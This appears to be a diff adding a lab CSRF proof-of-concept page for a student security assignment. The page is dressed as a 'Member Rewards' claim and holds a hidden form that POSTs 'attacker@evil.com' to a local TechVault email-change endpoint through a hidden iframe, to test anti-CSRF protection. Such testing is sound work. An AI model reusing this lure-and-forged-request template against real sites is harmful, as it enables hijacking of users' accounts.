@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberDefenders Network &bull; Partner Reward Verification</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f172a;
+            color: #f8fafc;
+            padding: 40px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .box {
+            max-width: 520px;
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            padding: 35px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        h1 {
+            color: #38bdf8;
+            font-size: 22px;
+            margin-bottom: 12px;
+        }
+
+        p {
+            color: #94a3b8;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        .reward-badge {
+            display: inline-block;
+            background: rgba(56, 189, 248, 0.15);
+            color: #38bdf8;
+            font-weight: 700;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            margin-bottom: 18px;
+        }
+
+        .btn-claim {
+            background: #38bdf8;
+            color: #090d16;
+            padding: 14px 28px;
+            font-size: 15px;
+            font-weight: 700;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+        }
+
+        .btn-claim:hover {
+            background: #7dd3fc;
+        }
+
+        #csrf_sink {
+            width: 100%;
+            height: 65px;
+            border: 1px solid #334155;
+            border-radius: 6px;
+            background: #090d16;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="box">
+        <div class="reward-badge">Simulated CSRF Exploit Test</div>
+        <h1>CyberDefenders Member Rewards</h1>
+        <p>
+            This page attempts to submit an unauthorized email change request to the <strong>Safe Version</strong> of TechVault without providing a valid Anti-CSRF Token.
+        </p>
+
+        <!-- Forged Request: targets hidden iframe to avoid page navigation and prevent CORS restrictions -->
+        <form id="csrfForm" action="http://localhost/IS_Assignment/safe/backend/api/update_email.php" method="POST" target="csrf_sink" onsubmit="handleFormSubmit()">
+            <input type="hidden" name="email" value="attacker@evil.com">
+            <button type="submit" class="btn-claim" id="btn-submit">Attempt CSRF Forgery &rarr;</button>
+        </form>
+
+        <div id="csrf-result-box" style="display: none; margin-top: 20px; padding: 14px; border-radius: 8px; font-size: 13px; text-align: left; background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; color: #fca5a5;">
+            <div style="font-weight: bold; font-size: 14px; margin-bottom: 6px; color: #ef4444;">
+                Server Response Output:
+            </div>
+            <iframe name="csrf_sink" id="csrf_sink"></iframe>
+        </div>
+    </div>
+
+    <script>
+        // Dynamically resolve target HTTP endpoint even if opened via file:///
+        const host = (window.location.hostname && window.location.hostname !== '') ? window.location.hostname : 'localhost';
+        const port = (window.location.port && window.location.port !== '80') ? ':' + window.location.port : '';
+        const targetUrl = window.location.protocol.startsWith('http')
+            ? `${window.location.protocol}//${host}${port}/IS_Assignment/safe/backend/api/update_email.php`
+            : `http://localhost${port}/IS_Assignment/safe/backend/api/update_email.php`;
+
+        document.getElementById('csrfForm').action = targetUrl;
+
+        function handleFormSubmit() {
+            document.getElementById('csrf-result-box').style.display = 'block';
+        }
+    </script>
+</body>
+
+</html>
